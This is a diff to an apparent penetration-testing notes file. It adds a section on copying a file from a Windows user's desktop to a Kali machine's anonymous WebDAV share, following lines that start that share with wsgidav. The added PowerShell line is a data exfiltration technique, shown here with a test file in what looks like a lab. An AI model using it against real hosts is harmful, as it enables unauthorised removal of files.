@@ -296,3 +296,8 @@ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
 dir \\192.168.49.128\DavWWWRoot
 ```
 
+#### Uploading from windows to kali
+```powershell
+copy C:\Users\john\Desktop\test.zip \\192.168.49.128\DavWWWRoot\
+```
+- copies `test.zip` from Windows into kali `/tmp`
